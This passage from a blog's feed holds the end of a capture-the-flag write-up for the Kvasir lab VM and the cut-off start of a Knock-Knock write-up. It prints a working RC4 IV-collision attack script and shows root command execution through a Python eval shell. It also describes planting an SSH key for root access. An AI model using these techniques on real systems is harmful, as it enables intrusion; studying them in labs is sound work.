<p>Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>

<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>

<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>

<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./un_wep-testing.py
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Generating base iv:cy dictionary with <span class="s1">&#39;A&#39;</span> *24
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> iv_dict knows about 5000 combinations
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Starting Bruteforce with <span class="s1">&#39;B&#39;</span> *24
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Frame matched IV of 929d87 in 4559 tries!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> A ^ B
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span></code></pre></td></tr></table></div></figure>


<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>

<p>With the changes in, I ended up with the following script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Kvasir RC4 Key Re-use Attack</span>
</span><span class='line'>
</span><span class='line'>import socket
</span><span class='line'>
</span><span class='line'><span class="c"># start a fresh iv_dict used for lookups</span>
</span><span class='line'><span class="nv">iv_dict</span> <span class="o">=</span> <span class="o">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connection to the thing</span>
</span><span class='line'><span class="nv">sock</span> <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
</span><span class='line'>sock.connect<span class="o">((</span><span class="s1">&#39;127.0.0.1&#39;</span>, 1234<span class="o">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read the banner so we can continue</span>
</span><span class='line'>
</span><span class='line'><span class="c"># =============================</span>
</span><span class='line'><span class="c"># Can you retrieve my secret..?</span>
</span><span class='line'><span class="c"># =============================</span>
</span><span class='line'><span class="c"># </span>
</span><span class='line'><span class="c"># Usage:</span>
</span><span class='line'><span class="c"># &#39;V&#39; to view the encrypted flag</span>
</span><span class='line'><span class="c"># &#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)</span>
</span><span class='line'><span class="nv">banner</span> <span class="o">=</span> sock.recv<span class="o">(</span>1024<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># create some iv:cyper combinations of the flag</span>
</span><span class='line'>print <span class="s1">&#39;[+] Generating base iv:cy dictionary&#39;</span>
</span><span class='line'><span class="k">for </span>i in range<span class="o">(</span>0,5000<span class="o">)</span>:
</span><span class='line'>    sock.send<span class="o">(</span><span class="s1">&#39;V\n&#39;</span><span class="o">)</span>
</span><span class='line'>    <span class="nv">frame</span> <span class="o">=</span> sock.recv<span class="o">(</span>150<span class="o">)</span>
</span><span class='line'>    <span class="nv">iv</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>0<span class="o">]</span>
</span><span class='line'>    <span class="nv">cy</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>1<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># add the values</span>
</span><span class='line'>    iv_dict<span class="o">[</span>iv<span class="o">]</span> <span class="o">=</span> cy.strip<span class="o">()</span>
</span><span class='line'>print <span class="s1">&#39;[+] The iv_dict knows about %d combinations&#39;</span> % len<span class="o">(</span>iv_dict<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start processing the second string, looking up the IV</span>
</span><span class='line'>print <span class="s1">&#39;[+] Starting Bruteforce with \&#39;B\&#39; *24&#39;</span>
</span><span class='line'><span class="nv">count</span> <span class="o">=</span> 0
</span><span class='line'><span class="k">while </span>True:
</span><span class='line'>
</span><span class='line'>    count +<span class="o">=</span> 1
</span><span class='line'>    sock.send<span class="o">(</span><span class="s1">&#39;E &#39;</span> + <span class="s1">&#39;B&#39;</span> *24 + <span class="s1">&#39;\n&#39;</span><span class="o">)</span>
</span><span class='line'>    <span class="nv">frame</span> <span class="o">=</span> sock.recv<span class="o">(</span>150<span class="o">)</span>
</span><span class='line'>    <span class="nv">iv</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>0<span class="o">]</span>
</span><span class='line'>    <span class="nv">cy</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>1<span class="o">]</span>.strip<span class="o">()</span> <span class="c"># annoying \n</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if </span>iv in iv_dict:
</span><span class='line'>        print <span class="s1">&#39;[+] Frame matched IV of %s in %d tries!&#39;</span> % <span class="o">(</span>iv, count<span class="o">)</span>
</span><span class='line'>        print <span class="s1">&#39;[+] Base Cyper Text was: %s&#39;</span> % iv_dict<span class="o">[</span>iv<span class="o">]</span>
</span><span class='line'>        print <span class="s1">&#39;[+] Matched Cypher Text: %s&#39;</span> % cy
</span><span class='line'>
</span><span class='line'>        <span class="c"># first XOR to get the keystream for this IV</span>
</span><span class='line'>        <span class="nv">keystream</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>a<span class="o">)</span> ^ ord<span class="o">(</span>b<span class="o">))</span> <span class="k">for </span>a,b in zip<span class="o">(</span>cy.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>,<span class="s1">&#39;B&#39;</span>*24<span class="o">))</span>
</span><span class='line'>        print <span class="s1">&#39;[+] Keystream: %s&#39;</span> % keystream.encode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># then decode second cypher text using the keystream for the cleartext</span>
</span><span class='line'>        <span class="nv">decrypted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>a<span class="o">)</span> ^ ord<span class="o">(</span>b<span class="o">))</span> <span class="k">for </span>a,b in zip<span class="o">((</span>iv_dict<span class="o">[</span>iv<span class="o">])</span>.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>,keystream<span class="o">))</span>
</span><span class='line'>        print <span class="s1">&#39;[+] Decrytped flag is: %s&#39;</span> % decrypted
</span><span class='line'>        <span class="nb">break</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># progress incase things take longer than expected</span>
</span><span class='line'>    <span class="k">if </span>count % <span class="nv">100000</span> <span class="o">==</span> 0:
</span><span class='line'>        print <span class="s1">&#39;[+] Tries: %d&#39;</span> % count
</span><span class='line'>
</span><span class='line'>print <span class="s1">&#39;[+] Done&#39;</span>
</span><span class='line'>sock.close<span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>In no time at all, the above code outputs the decrypted flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./un_wep.py
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Generating base iv:cy dictionary
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> The iv_dict knows about 5000 combinations
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Starting Bruteforce with <span class="s1">&#39;B&#39;</span> *24
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Frame matched IV of 06f39e in 1696 tries!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Decrytped flag is: 0W6U6vwG4W1V
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span></code></pre></td></tr></table></div></figure>


<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>

<h2>finally getting the flag, sort of&hellip;</h2>

<p>I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>

<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc -v 127.0.0.1 1234
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>127.0.0.1: inverse host lookup failed:
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1<span class="o">]</span> 1234 <span class="o">(</span>?<span class="o">)</span> open : Operation now in <span class="nv">progress</span>
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>Can you retrieve my secret..?
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>0W6U6vwG4W1V
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; ls
</span><span class='line'>&gt; id
</span><span class='line'>&gt; whoami
</span><span class='line'>&gt; ls -lah
</span><span class='line'>&gt; uname -a
</span><span class='line'>&gt; <span class="nb">help</span>
</span><span class='line'>&gt; ?
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>NameError: name <span class="s1">&#39;ls&#39;</span> is not defined
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>NameError: name <span class="s1">&#39;whoami&#39;</span> is not defined
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>NameError: name <span class="s1">&#39;ls&#39;</span> is not defined
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>NameError: name <span class="s1">&#39;uname&#39;</span> is not defined
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1
</span><span class='line'>    ?
</span><span class='line'>    ^
</span><span class='line'>SyntaxError: invalid syntax
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 94, in &lt;module&gt;
</span><span class='line'>    handler<span class="o">(</span>sock, addr<span class="o">)</span>
</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 74, in handler
</span><span class='line'>    sock.send<span class="o">(</span>p1<span class="o">)</span>
</span><span class='line'>socket.error: <span class="o">[</span>Errno 32<span class="o">]</span> Broken pipe
</span><span class='line'>kefka@adm:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0W6U6vwG4W1V
</span><span class='line'>&gt; import os<span class="p">;</span> os.system<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yay :) I went straight for the <code>cat /root/flag</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; import os<span class="p">;</span> os.system<span class="o">(</span><span class="s1">&#39;cat /root/flag&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    _  __                             _
</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ I /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
</span><span class='line'>
</span><span class='line'>Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
</span><span class='line'>gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
</span><span class='line'>gur Zrnq bs Cbrgel...
</span><span class='line'>
</span><span class='line'>Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
</span><span class='line'>Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
</span><span class='line'>
</span><span class='line'>Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
</span><span class='line'>uggc://jv-sh.pb.hx, <span class="c">#IhyaUho VEP be Gjvggre.</span>
</span><span class='line'>
</span><span class='line'>  enfgn_zbhfr<span class="o">(</span>@_EnfgnZbhfr<span class="o">)</span>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&rsquo;d in as root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>Linux adm 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Nov  9 16:57:16 2014 from localhost
</span><span class='line'>root@adm:~#
</span></code></pre></td></tr></table></div></figure>


<h2>the final troll</h2>

<p>With the <code>/root/flag</code> in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with <code>decode()</code> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@adm:~# python
</span><span class='line'>Python 2.7.3 <span class="o">(</span>default, Mar 13 2014, 11:03:55<span class="o">)</span>
</span><span class='line'><span class="o">[</span>GCC 4.7.2<span class="o">]</span> on linux2
</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
</span><span class='line'>&gt;&gt;&gt; with open<span class="o">(</span><span class="s1">&#39;/root/flag&#39;</span><span class="o">)</span> as f:
</span><span class='line'>...     <span class="nv">flag</span> <span class="o">=</span> f.read<span class="o">()</span>
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; print flag.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)</span>
</span><span class='line'>    _  __                             _
</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ V /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
</span><span class='line'>
</span><span class='line'>Congratulations on beating Kvasir - I hope you enjoyed
</span><span class='line'>the ride.  Take his blood, mix with honey and drink
</span><span class='line'>the Mead of Poetry...
</span><span class='line'>
</span><span class='line'>Big shout out to my beta testers: @barrebas and @TheColonial.
</span><span class='line'>Special thanks to Bas <span class="k">for </span>his patience during this endeavour.
</span><span class='line'>
</span><span class='line'>Feel free to ping me with thoughts/comments on
</span><span class='line'>http://wi-fu.co.uk, <span class="c">#VulnHub IRC or Twitter.</span>
</span><span class='line'>
</span><span class='line'>  rasta_mouse<span class="o">(</span>@_RastaMouse<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>

<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[knock-knock who’s there?]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/"/>
    <updated>2014-10-14T09:14:26+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<!--more-->


<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo nmap -sN 192.168.56.0/24
</span><span class='line'>
